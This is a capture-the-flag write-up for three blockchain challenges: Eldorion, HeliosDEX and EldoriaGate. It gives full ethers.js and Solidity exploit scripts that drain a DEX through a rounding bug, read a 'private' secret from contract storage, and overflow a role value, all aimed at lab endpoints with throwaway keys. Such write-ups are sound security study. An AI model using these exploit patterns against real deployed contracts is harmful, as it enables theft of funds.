# blockchain


## Eldorion
> Solved by Starry-Lord

![](https://i.imgur.com/VxfRD0j.png)


This Beast was killed with adding an attacker.sol contract to bypass the “eternal resilience” function, which kept healing the boss after each attack. So we needed to make a triple attack:


    cat contracts/attack.sol                                                                                        
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface IEldorion {
        function attack(uint256 damage) external;
    }
    
    contract Attacker {
        function attackThree(address target) external {
            IEldorion(target).attack(100);
            IEldorion(target).attack(100);
            IEldorion(target).attack(100);
        }
    }

here is the attack script with ethers.js v5 (because i never managed to make this challenge return valid JSON with v6:


    const fs = require("fs");
    const path = require("path");
    const solc = require("solc");
    const { ethers } = require("ethers");
    
    // === Config ===
    const RPC_URL = "http://83.136.253.25:50179";
    const PRIVATE_KEY = "0x0ce0d36d2fb2e0cfc7f413aec7acf865871b6f71f28ffda18cff63ab50a8c59c";
    
    const eldorionAddress = "0x6114F5Aca890BaE0b153de34Cd024ba24C2A3A68";
    const setupAddress    = "0xaed4036993875E6C22E37BC1a12EFB81e89A9222";
    
    const eldorionAbi = [
      "function health() view returns (uint256)",
      "function isDefeated() view returns (bool)"
    ];
    const setupAbi = [
      "function isSolved() view returns (bool)"
    ];
    const attackerAbi = [
      "function attackThree(address target) external"
    ];
    
    // === Setup Provider + Signer ===
    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const signer = new ethers.Wallet(PRIVATE_KEY, provider);
    
    // === Compile Attacker.sol ===
    async function compileAttacker() {
      const filePath = path.join(__dirname, "../contracts/attack.sol");
      const source = fs.readFileSync(filePath, "utf8");
    
      const input = {
        language: "Solidity",
        sources: {
          "attack.sol": { content: source }
        },
        settings: {
          outputSelection: {
            "*": {
              "*": ["abi", "evm.bytecode"]
            }
          }
        }
      };
    
      const output = JSON.parse(solc.compile(JSON.stringify(input)));
    
      // Print compilation errors
      if (output.errors) {
        for (const error of output.errors) {
          console.error(error.formattedMessage);
        }
      }
    
      const contract = output.contracts["attack.sol"]?.["Attacker"];
      if (!contract) {
        throw new Error("❌ Compilation failed: Attacker contract not found.");
      }
    
      return {
        abi: contract.abi,
        bytecode: contract.evm.bytecode.object
      };
    }
    
    // === Main Execution ===
    async function main() {
      console.log("Attacker:", await signer.getAddress());
    
      const { abi, bytecode } = await compileAttacker();
    
      const factory = new ethers.ContractFactory(abi, bytecode, signer);
      const attacker = await factory.deploy();
      await attacker.deployed();
      console.log("🚀 Attacker contract deployed at:", attacker.address);
    
      const tx = await attacker.attackThree(eldorionAddress);
      await tx.wait();
      console.log("⚔ Sent 3 attacks in a single transaction!");
    
      const eldorion = new ethers.Contract(eldorionAddress, eldorionAbi, signer);
      const setup = new ethers.Contract(setupAddress, setupAbi, signer);
    
      const health = await eldorion.health();
      console.log("🧪 Eldorion's Health:", health.toString());
    
      const defeated = await eldorion.isDefeated();
      console.log("💀 Eldorion Defeated?", defeated);
    
      const solved = await setup.isSolved();
      console.log("🏁 Challenge Solved?", solved ? "✅ YES" : "❌ Not yet");
    
      if (solved) {
        console.log("🎉 Go grab your flag!");
      }
    }
    
    main().catch((err) => {
      console.error("💥 Error:", err.message || err);
    });
    
![](https://i.imgur.com/Zmnbjk5.png)

----------

## HeliosDEX
> Solved by Starry-Lord

We have a Setup.sol and a HeliosDEX.sol to review. In HeliosDEX.sol this flaw was found:


    function swapForELD() external payable underHeliosEye {
            uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
            uint256 fee = (grossELD * feeBps) / 10_000;
            uint256 netELD = grossELD - fee;
    
            require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
    
            reserveELD -= netELD;
            eldorionFang.transfer(msg.sender, netELD);
    
            emit HeliosBarter(address(eldorionFang), msg.value, netELD);
        }
    
        function swapForMAL() external payable underHeliosEye {
            uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
            uint256 fee = (grossMal * feeBps) / 10_000;
            uint256 netMal = grossMal - fee;
    
            require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
    
            reserveMAL -= netMal;
            malakarEssence.transfer(msg.sender, netMal);
    
            emit HeliosBarter(address(malakarEssence), msg.value, netMal);
        }
    
        function swapForHLS() external payable underHeliosEye {
            uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3)); <----- That's the issue here
            uint256 fee = (grossHLS * feeBps) / 10_000;
            uint256 netHLS = grossHLS - fee;
            
            require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
            
    
            reserveHLS -= netHLS;
            heliosLuminaShards.transfer(msg.sender, netHLS);
    
            emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
        }

According to OpenZeppelin’s documentation for the Math Library:


    enum Rounding {
        Down, // Toward negative infinity --> Math.Rounding(0)
        Up, // Toward infinity --> Math.Rounding(1)
        Zero // Toward zero --> Math.Rounding(2)
    }

This means Math.Rounding(3) will cause unexpected behaviors, here are the key points:
Since `3` isn't defined, the compiler treats it as an undefined value, falling back to default rounding behavior which is **Up** [**🎉🎉🎉**](https://emojipedia.org/party-popper)

This rounding made me rich after 250 swaps! Just had to make sure to only swap 1 Wei each time and call the refund function once only, as per the contracts.


![](https://i.imgur.com/Kjig6bi.png)



drain.js script


    const { ethers } = require("ethers");
    
    // Your setup info
    const RPC_URL = "http://94.237.57.122:59310";
    const PLAYER_PRIVATE_KEY = "0xc355db294444232fe7a8e308550e87f2f79c617b7f04541d2f44348235dbf133";
    const PLAYER_ADDRESS = "0xF44279bF0072cd7BD98F4b994d3E7ad7ed15Cd45";
    
    // Contracts
    const SETUP_ADDRESS = "0xD05A41b677783bAB39B68499F8f11f8066A61545";
    
    const SETUP_ABI = [
      "function isSolved() public view returns (bool)",
      "function TARGET() public view returns (address)"
    ];
    
    const HELIOS_DEX_ABI = [
      "function swapForHLS() external payable",
      "function oneTimeRefund(address item, uint256 amount) external",
      "function heliosLuminaShards() external view returns (address)",
      "function hasRefunded(address user) external view returns (bool)"
    ];
    
    const ERC20_ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)"
    ];
    
    async function main() {
      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
      const wallet = new ethers.Wallet(PLAYER_PRIVATE_KEY, provider);
    
      const setupContract = new ethers.Contract(SETUP_ADDRESS, SETUP_ABI, wallet);
      const targetAddress = await setupContract.TARGET();
      const dex = new ethers.Contract(targetAddress, HELIOS_DEX_ABI, wallet);
    
      const hlsAddress = await dex.heliosLuminaShards();
      const hlsToken = new ethers.Contract(hlsAddress, ERC20_ABI, wallet);
    
      console.log(`Connected to HeliosDEX at: ${targetAddress}`);
    
      // Exploit: repeatedly swap very small ETH amounts to get HLS due to faulty rounding
      const exploitValue = ethers.utils.parseUnits("1", "wei"); // smallest possible ETH amount
      const iterations = 250; // Do multiple swaps to accumulate tokens efficiently
    
      console.log(`Starting exploit with ${iterations} swaps of 1 wei each...`);
      for (let i = 0; i < iterations; i++) {
        const txSwap = await dex.swapForHLS({ value: exploitValue });
        await txSwap.wait();
        console.log(`Swap #${i + 1} completed.`);
      }
    
      // Check accumulated HLS balance
      const hlsBalance = await hlsToken.balanceOf(PLAYER_ADDRESS);
      console.log(`Accumulated HLS balance: ${ethers.utils.formatUnits(hlsBalance, 18)} HLS`);
    
      // Approve the DEX to spend tokens
      const approveTx = await hlsToken.approve(targetAddress, hlsBalance);
      await approveTx.wait();
      console.log("Approved DEX to spend HLS tokens.");
    
      // Perform refund once to gain ETH
      const hasRefunded = await dex.hasRefunded(PLAYER_ADDRESS);
      if (!hasRefunded) {
        const refundTx = await dex.oneTimeRefund(hlsAddress, hlsBalance, { gasLimit: 1000000 });
        await refundTx.wait();
        console.log("Refund executed successfully.");
      } else {
        console.log("Refund already executed previously.");
      }
    
      const playerBalance = await provider.getBalance(PLAYER_ADDRESS);
      console.log(`Final player's ETH balance: ${ethers.utils.formatEther(playerBalance)} ETH`);
    
      const solved = await setupContract.isSolved();
      if (solved) {
        console.log("Challenge Solved! Player has 20 ETH or more.");
      } else {
        console.log("Not solved yet, consider increasing iterations.");
      }
    }
    
    main().catch((error) => {
      console.error("Error during exploit execution:", error);
    });
    


----------
## EldoriaGate
> Solved by Starry-Lord


    contract EldoriaGateKernel {
        bytes4 private eldoriaSecret;
        ...
    }

First I thought we needed to Bruteforce the secret, but then I realised the value was getting stored on-chain, and as we all know, on-chain storage is public [**😉**](https://emojipedia.org/winking-face), so we could just extract it from the creation of the contract’s transaction.

Since it’s the first declared variable, it is stored at slot 0 on the EldorianGateKernel contract address.

With that we managed to authenticate, but we still needed to become the “Usurper” which is basically not receiving any role, but the contract assigne the ROLE_SERF by default:


    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
                ...
                let defaultRolesMask := ROLE_SERF
                roles := add(defaultRolesMask, _contribution)
                if lt(roles, defaultRolesMask) { revert(0, 0) }
                ...
        }

But we can break it by passing the contribution value 255, which is an 8-bit value. The key here is that shifting left an 8-bit value by 256 brings us back to 0, thus allowing us to not get a default role:


    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
            assembly {
                mstore(0x00, _unknown)
                mstore(0x20, villagers.slot)
                let villagerSlot := keccak256(0x00, 0x40)
                mstore(0x00, _unknown)
                id := keccak256(0x00, 0x20)
                sstore(villagerSlot, id)
                let storedPacked := sload(add(villagerSlot, 1))
                let storedAuth := and(storedPacked, 0xff)
                if iszero(storedAuth) { revert(0, 0) }
                let defaultRolesMask := ROLE_SERF
                roles := add(defaultRolesMask, _contribution)
                if lt(roles, defaultRolesMask) { revert(0, 0) }
                let packed := or(storedAuth, shl(8, roles))
                sstore(add(villagerSlot, 1), packed)
        }
    }

solve.js with ethers.js v5:


    const { ethers } = require("ethers");
    
    const RPC_URL = "http://94.237.58.78:50156";
    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    
    // CONFIGURATION
    const TARGET_ADDRESS = "0x89B1908C814588a24269cD14409ba6b4B15a709B"; // EldoriaGate
    const PLAYER_PRIVATE_KEY = "0x63ddf21f62799265b687cd70c91065c94b75aa8b9aab40d2f122c14dc0513c32";
    
    // CONTRACT ABIs
    const EldoriaGateABI = [
      "function enter(bytes4 passphrase) external payable",
      "function kernel() public view returns (address)"
    ];
    
    // Setup
    const player = new ethers.Wallet(PLAYER_PRIVATE_KEY, provider);
    const gate = new ethers.Contract(TARGET_ADDRESS, EldoriaGateABI, player);
    
    async function main() {
      console.log("[*] Getting EldoriaGateKernel address...");
      const kernelAddress = await gate.kernel();
      console.log("[+] Kernel address:", kernelAddress);
    
      console.log("[*] Reading storage slot 0 from kernel...");
      const rawSlot = await provider.getStorageAt(kernelAddress, 0);
      console.log("[+] Raw slot 0 data:", rawSlot);
    
      // Extract last 4 bytes (right-aligned)
      const guess = "0x" + rawSlot.slice(66 - 8);
      console.log("[+] Interpreted eldoriaSecret:", guess);
    
      console.log("[*] Attempting to call enter() with secret...");
    
      try {
        const tx = await gate.enter(guess, { value: 255 });
        await tx.wait();
        console.log(`\n🎉 [SUCCESS] Authentication passed with secret: ${guess}`);
      } catch (err) {
        const reason = err?.error?.message || err?.reason || "Unknown error";
        console.log(`\n[x] enter(${guess}) failed: ${reason}`);
      }
    }
    
    main().catch(console.error);
    


![](https://i.imgur.com/7P2f4OD.png)


